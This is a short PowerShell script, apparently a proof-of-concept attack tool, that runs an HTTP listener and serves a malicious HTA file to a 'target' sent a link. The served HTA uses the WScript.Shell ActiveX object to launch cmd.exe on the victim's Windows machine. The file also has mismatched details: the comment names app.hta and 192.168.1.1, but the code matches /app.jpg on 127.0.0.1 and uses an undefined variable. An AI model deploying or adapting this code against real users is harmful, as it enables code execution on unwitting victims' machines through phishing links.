<#
  Simply Invoke the Script and send the target a link to http://[Server]/app.hta
  To change your server, simply find and replace 192.168.1.1 with your server in the code.
  @subtee
#>



$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://127.0.0.1:8080/') 

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	#Use this for One-Liner Start
	
    if ($request.Url -match '/app.jpg$' -and ($request.HttpMethod -eq "GET")) {
		$enc = [system.Text.Encoding]::UTF8
		$response.ContentType = 'application/hta'
		$htacode = '<html>
					  <head>
						<script>
						var c = "cmd.exe";
						new ActiveXObject(''WScript.Shell'').Run(c);
						</script>
					  </head>
					  <body>
					  <script>self.close();
					  </body>
					</html>'
		
		$buffer = $enc.GetBytes($htacode)		
		$response.ContentLength64 = $buffer.length
		$output = $response.OutputStream
		$output.Write($buffer, 0, $buffer.length)
		$output.Close()
		continue
	}
    

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
